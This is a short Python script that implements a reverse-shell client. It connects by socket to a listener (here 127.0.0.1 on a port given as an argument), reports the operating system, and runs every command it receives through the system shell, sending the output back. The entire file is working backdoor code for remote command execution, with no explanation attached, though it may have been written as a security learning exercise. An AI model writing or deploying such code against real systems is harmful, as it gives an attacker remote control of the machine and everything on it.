#!/usr/bin/env python3
import argparse
import socket
import subprocess
import platform
import os

argument =argparse.ArgumentParser()
argument.add_argument('port',type=int)
args = argument.parse_args()
new_port = args.port
operating_system= platform.system()

client_socket=socket.socket()
client_socket.connect(("127.0.0.1",new_port))
client_socket.send(operating_system.encode())
while True:
    
    client_message=client_socket.recv(1024).decode()
    if not client_message:
        break
    if client_message.strip().lower()== "exit":
        print("Exiting")
        break
    cwd = os.getcwd()
    if client_message.startswith('cd'):
        new_dir = client_message.split(" ",1)[1]
        os.chdir(new_dir)
        client_socket.send(new_dir.encode())
    output = subprocess.run(client_message,shell=True, capture_output=True,text=True)
    client_socket.send(output.stdout.encode() + output.stderr.encode())
    

    
client_socket.close()
exit(0)